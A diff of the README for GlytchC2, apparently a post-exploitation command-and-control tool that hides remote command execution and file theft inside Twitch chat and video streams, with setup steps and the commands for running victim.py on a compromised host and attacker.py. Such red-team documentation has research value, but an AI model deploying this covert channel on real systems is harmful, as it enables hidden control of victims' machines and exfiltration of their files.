@@ -32,14 +32,30 @@ Currently, **"GlytchC2"** offers two functionalities:
 <p align="center"> <img src="rsc/GlytchC2_MainExecutionFlow.jpg" /> </p>
 <p align="center"> Figure 1 - Main Execution Flow </p>
 
-## Proof-of-Concepts (PoCs) & How it works
+## Proof-of-Concept (PoC) & How it works
 
 ### PoC Video
 
 [![GlytchC2 PoC](rsc/yt_banner.PNG)](https://youtu.be/FzUCudF7iUo)
 <p align="center"> Video 1 - PoC </p>
 
-### Proof-of-Concepts (PoCs)
+### Installation of dependencies
+
+ - Rename ``example.env`` files to ``.env``, both for attacker and victim
+ - Get the oauth token to access chat from ``https[:]//twitchtokengenerator[.]com/`` ( credits: swiftyspiffy ) ( redirected from ``https[:]//twitchapps[.]com/tmi`` )
+ - Replace the username and tokens
+
+ - Get the stream key from ``Twitch > Creator dashboard > Settings > Stream > Primary stream key``
+ - Stream key is provided to ``victim.py`` , channel is provided to both ``victim.py`` and ``attacker.py`` as CLI arguments.
+
+```
+# sudo apt install python3-pil python3-emoji python3-decouple ffmpeg streamlink
+```
+<p align="center"> Code Block 1 - Installing Dependencies </p>
+
+ - Note : Valid for Kali 2025.2 , other distros might require different packages
+
+### Proof-of-Concept (PoC)
 
 - As this tool can be used on post-exploitation, you need a working shell on the target environment and have necessary permissions/privileges.
 - Run ``victim.py`` first and then run ``attacker.py``
@@ -49,7 +65,7 @@ Currently, **"GlytchC2"** offers two functionalities:
 # cd victim
 # python3 victim.py --channel <CHANNEL_NAME> --streamkey <RTMP_KEY>
 ```
-<p align="center"> Code Block 1 - Running "victim.py" </p>
+<p align="center"> Code Block 2 - Running "victim.py" </p>
 
 - Then, victim waits for receiving a request containing either an OS command or a file with it's path:
 
@@ -62,7 +78,7 @@ Currently, **"GlytchC2"** offers two functionalities:
 # cd attacker
 # python3 attacker.py --channel <CHANNEL_NAME>
 ```
-<p align="center"> Code Block 2 - Running "attacker.py" </p>
+<p align="center"> Code Block 3 - Running "attacker.py" </p>
 
 <p align="center"> <img src="rsc/attacker_initialexec.PNG" /> </p>
 <p align="center"> Figure 3 - Running "attacker.py" </p>
@@ -241,5 +257,6 @@ Fragmentation:
 
 ## Credit
 
-- [Twitch Chat IRC - Xenova GitHub](https://github.com/xenova/twitch-chat-irc/)
 - Special thanks to: [Contributor: Istemihan Bulut](https://github.com/istemihanbulut)
+- [Twitch Chat IRC - Xenova GitHub](https://github.com/xenova/twitch-chat-irc/)
+- [Twitch Token Generator - swiftyspiffy GitHub](https://github.com/swiftyspiffy)
